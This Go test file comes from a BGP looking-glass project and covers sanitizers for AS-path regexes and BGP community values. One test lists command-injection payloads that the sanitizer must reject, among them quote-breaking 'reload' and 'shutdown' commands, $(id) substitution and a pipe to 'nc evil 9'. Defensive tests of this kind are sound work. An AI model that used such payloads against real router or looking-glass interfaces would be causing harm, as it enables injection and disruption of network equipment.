package utils

import (
	"errors"
	"math"
	"testing"

	"github.com/AS203038/looking-glass/pkg/errs"
)

// TestSanitizeASPathRegexValid verifies that well-formed AS-path
// inputs round-trip with leading "_" and trailing "_" or "$" anchors.
func TestSanitizeASPathRegexValid(t *testing.T) {
	cases := []struct {
		in   string
		want string
	}{
		{"203038", "_203038$"},
		{"_203038", "_203038$"},
		{"203038_", "_203038_"},
		{"_203038_", "_203038_"},
		{"203038$", "_203038$"},
		{"_203038$", "_203038$"},
		{"_2_3_8_", "_2_3_8_"},
		{"1", "_1$"},
	}
	for _, tc := range cases {
		got, err := SanitizeASPathRegex(tc.in)
		if err != nil {
			t.Errorf("SanitizeASPathRegex(%q) returned error %v; want nil", tc.in, err)
			continue
		}
		if got != tc.want {
			t.Errorf("SanitizeASPathRegex(%q) = %q; want %q", tc.in, got, tc.want)
		}
	}
}

// TestSanitizeASPathRegexBoundaryErrors verifies the empty-input and
// 30-byte length-cap sentinel errors.
func TestSanitizeASPathRegexBoundaryErrors(t *testing.T) {
	if _, err := SanitizeASPathRegex(""); !errors.Is(err, errs.ASPathEmpty) {
		t.Errorf("empty input: got err=%v; want %v", err, errs.ASPathEmpty)
	}
	tooLong := "1234567890123456789012345678901"
	if _, err := SanitizeASPathRegex(tooLong); !errors.Is(err, errs.ASPathTooLong) {
		t.Errorf("over-long input: got err=%v; want %v", err, errs.ASPathTooLong)
	}
}

// TestSanitizeASPathRegexRejectsExploits verifies that every payload
// outside the digit/underscore/optional-"$" allow-list is rejected
// with [errs.ASPathMalformed].
func TestSanitizeASPathRegexRejectsExploits(t *testing.T) {
	exploits := []string{
		`1';reload;'`,
		`1' ; shutdown ;'`,
		`1'$(id)'`,
		"1'`id`'",
		`1'|nc evil 9'`,
		`1";reload;"`,
		`1"$(id)"`,
		"1\"`id`\"",
		`1 reload`,
		`1;reload`,
		"1\nreload",
		"1\rreload",
		"1\treload",
		`.*`,
		`1.*`,
		`1|2`,
		`(1|2)`,
		`1\d`,
		`1a`,
		`a1`,
		`1 2`,
		"1\x002",
		`$1`,
		`1$1`,
		`1$$`,
		`$`,
		` 1`,
		`1 `,
		"\t1",
		"1\n",
	}
	for _, in := range exploits {
		got, err := SanitizeASPathRegex(in)
		if !errors.Is(err, errs.ASPathMalformed) {
			t.Errorf("SanitizeASPathRegex(%q) = (%q, %v); want (\"\", %v)",
				in, got, err, errs.ASPathMalformed)
		}
	}
}

// TestSanitizeBGPCommunityValid verifies that in-range (asn, value)
// pairs return the canonical "ASN:VALUE" decimal form.
func TestSanitizeBGPCommunityValid(t *testing.T) {
	cases := []struct {
		asn, value int32
		want       string
	}{
		{0, 0, "0:0"},
		{1, 1, "1:1"},
		{65000, 100, "65000:100"},
		{65535, 65535, "65535:65535"},
		{203, 38, "203:38"},
	}
	for _, tc := range cases {
		got, err := SanitizeBGPCommunity(tc.asn, tc.value)
		if err != nil {
			t.Errorf("SanitizeBGPCommunity(%d, %d) returned error %v; want nil",
				tc.asn, tc.value, err)
			continue
		}
		if got != tc.want {
			t.Errorf("SanitizeBGPCommunity(%d, %d) = %q; want %q",
				tc.asn, tc.value, got, tc.want)
		}
	}
}

// TestSanitizeBGPCommunityRejectsOutOfRange verifies that every (asn,
// value) pair outside 0..65535 is rejected with [errs.CommunityMalformed].
func TestSanitizeBGPCommunityRejectsOutOfRange(t *testing.T) {
	cases := []struct {
		asn, value int32
	}{
		{-1, 0},
		{0, -1},
		{-1, -1},
		{math.MinInt32, 0},
		{0, math.MinInt32},
		{65536, 0},
		{0, 65536},
		{65536, 65536},
		{math.MaxInt32, 0},
		{0, math.MaxInt32},
		{math.MaxInt32, math.MaxInt32},
	}
	for _, tc := range cases {
		got, err := SanitizeBGPCommunity(tc.asn, tc.value)
		if !errors.Is(err, errs.CommunityMalformed) {
			t.Errorf("SanitizeBGPCommunity(%d, %d) = (%q, %v); want (\"\", %v)",
				tc.asn, tc.value, got, err, errs.CommunityMalformed)
		}
	}
}

// TestSanitizeBGPLargeCommunity verifies that every (global, local1,
// local2) triple returns the canonical "GLOBAL:LOCAL1:LOCAL2" form
// across the full uint32 range.
func TestSanitizeBGPLargeCommunity(t *testing.T) {
	cases := []struct {
		global, local1, local2 uint32
		want                   string
	}{
		{0, 0, 0, "0:0:0"},
		{1, 1, 1, "1:1:1"},
		{203038, 8, 3607, "203038:8:3607"},
		{math.MaxUint32, math.MaxUint32, math.MaxUint32,
			"4294967295:4294967295:4294967295"},
	}
	for _, tc := range cases {
		got := SanitizeBGPLargeCommunity(tc.global, tc.local1, tc.local2)
		if got != tc.want {
			t.Errorf("SanitizeBGPLargeCommunity(%d, %d, %d) = %q; want %q",
				tc.global, tc.local1, tc.local2, got, tc.want)
		}
	}
}
